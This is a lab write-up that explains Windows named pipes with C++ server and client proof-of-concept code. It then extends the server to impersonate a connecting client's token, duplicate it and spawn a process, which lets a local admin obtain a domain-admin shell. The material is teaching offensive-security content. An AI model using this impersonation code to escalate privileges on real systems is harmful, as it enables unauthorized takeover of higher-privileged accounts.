# Windows NamedPipes 101 + Privilege Escalation

## Overview

A `pipe` is a block of shared memory that processes can use for communication and data exchange.

`Named Pipes` is a Windows mechanism that enables two unrelated processes to exchange data between themselves, even if the processes are located on two different networks. It's very simar to client/server architecture as notions such as `a named pipe server` and a named `pipe client` exist.

A named pipe server can open a named pipe with some predefined name and then a named pipe client can connect to that pipe via the known name. Once the connection is established, data exchange can begin.

This lab is concerned with a simple PoC code that allows:

* creating a single-threaded dumb named pipe server that will accept one client connection
* named pipe server to write a simple message to the named pipe so that the pipe client can read it

## Code

Below is the PoC for both the server and the client:

{% tabs %}
{% tab title="namedPipeServer.cpp" %}
```cpp
#include "pch.h"
#include <Windows.h>
#include <iostream>

int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	return 0;
}
```
{% endtab %}

{% tab title="namedPipeClient.cpp" %}
```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>

const int MESSAGE_SIZE = 512;

int main()
{
	LPCWSTR pipeName = L"\\\\10.0.0.7\\pipe\\mantvydas-first-pipe";
	HANDLE clientPipe = NULL;
	BOOL isPipeRead = true;
	wchar_t message[MESSAGE_SIZE] = { 0 };
	DWORD bytesRead = 0;

	std::wcout << "Connecting to " << pipeName << std::endl;
	clientPipe = CreateFile(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	
	while (isPipeRead) {
		isPipeRead = ReadFile(clientPipe, &message, MESSAGE_SIZE, &bytesRead, NULL);
		std::wcout << "Received message: " << message;
	}

	return 0;
}
```
{% endtab %}
{% endtabs %}

## Execution

Below shows the named pipe server and named pipe client working as expected:

![](../../.gitbook/assets/screenshot-from-2019-04-02-23-44-22.png)

Worth nothing that the named pipes communication by default uses SMB protocol:

![](../../.gitbook/assets/screenshot-from-2019-04-04-23-51-48.png)

Checking how the process maintains a handle to our named pipe `mantvydas-first-pipe`:

![](../../.gitbook/assets/screenshot-from-2019-04-06-14-40-57.png)

Similary, we can see the client having an open handle to the named pipe:

![](../../.gitbook/assets/screenshot-from-2019-04-06-14-59-41.png)

We can even see our pipe with powershell:

```csharp
((Get-ChildItem \\.\pipe\).name)[-1..-5]
```

![](../../.gitbook/assets/screenshot-from-2019-04-06-15-09-05.png)

## Token Impersonation

It is possible for the named pipe server to impersonate the named pipe client's security context by leveraging a `ImpersonateNamedPipeClient` API call which in turn changes the named pipe server's current thread's token with that of the named pipe client's token.

We can update the the named pipe server's code like this to achieve the impersonation - note that modifications are seen in line 25 and below: 

```cpp
int main() {
	LPCWSTR pipeName = L"\\\\.\\pipe\\mantvydas-first-pipe";
	LPVOID pipeBuffer = NULL;
	HANDLE serverPipe;
	DWORD readBytes = 0;
	DWORD readBuffer = 0;
	int err = 0;
	BOOL isPipeConnected;
	BOOL isPipeOpen;
	wchar_t message[] = L"HELL";
	DWORD messageLenght = lstrlen(message) * 2;
	DWORD bytesWritten = 0;

	std::wcout << "Creating named pipe " << pipeName << std::endl;
	serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
	
	isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
	if (isPipeConnected) {
		std::wcout << "Incoming connection to " << pipeName << std::endl;
	}
	
	std::wcout << "Sending message: " << message << std::endl;
	WriteFile(serverPipe, message, messageLenght, &bytesWritten, NULL);
	
	std::wcout << "Impersonating the client..." << std::endl;
	ImpersonateNamedPipeClient(serverPipe);
	err = GetLastError();	

	STARTUPINFO	si = {};
	wchar_t command[] = L"C:\\Windows\\system32\\notepad.exe";
	PROCESS_INFORMATION pi = {};
	HANDLE threadToken = GetCurrentThreadToken();
	CreateProcessWithTokenW(threadToken, LOGON_WITH_PROFILE, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	return 0;
}
```

Running the server and connecting to it with the client that is running under administrator@offense.local security context, we can see that the main thread of the named server pipe assumed the token of the named pipe client - offense\administrator, although the PipeServer.exe itself is running under ws01\mantvydas security context. Sounds like a good way to escalate privileges?

![](../../.gitbook/assets/screenshot-from-2019-04-07-18-00-49.png)

Not so fast - unfortunately, I was not able to properly duplicate the token and use it to our advantage with the following code:

```cpp
	HANDLE 
		threadToken = NULL,
		duplicatedToken = NULL;

	OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &threadToken);
	DuplicateTokenEx(threadToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicatedToken);
	err = GetLastError();
	CreateProcessWithTokenW(duplicatedToken, 0, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
```

For some reason, the DuplicateTokenEx call would return an error `1346 ERROR_BAD_IMPERSONATION_LEVEL` and I could not figure out what the issue was, so if you know, I would like to hear from you.

### Update \#1

I was contacted by [Raymond Roethof](https://www.thalpius.com) and [@exist91240480](https://twitter.com/exist91240480) \(huge thank you both!\) and they suggested that my named pipe server was not holding `SeImpersonatePrivilege`which was causing the `ERROR_BAD_IMPERSONATION_LEVEL` when calling `DuplicateTokenEx`. Once the server hold the required privilege, everything worked as expected.

Note how `PipeServer.exe` running as a local admin `ws01\mantvydas` spawned a cmd shell with domain admin privileges `offense\administrator`- due to successfull token impersonation via named pipes:

![](../../.gitbook/assets/screenshot-from-2019-05-06-12-59-57.png)

{% hint style="info" %}
Note that this technique is used by meterpreter when attempting to escalate privileges when `GetSystem` command is used.. The same technique is used in the `PowerUp`.
{% endhint %}

## References

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/ipc/interprocess-communications" %}

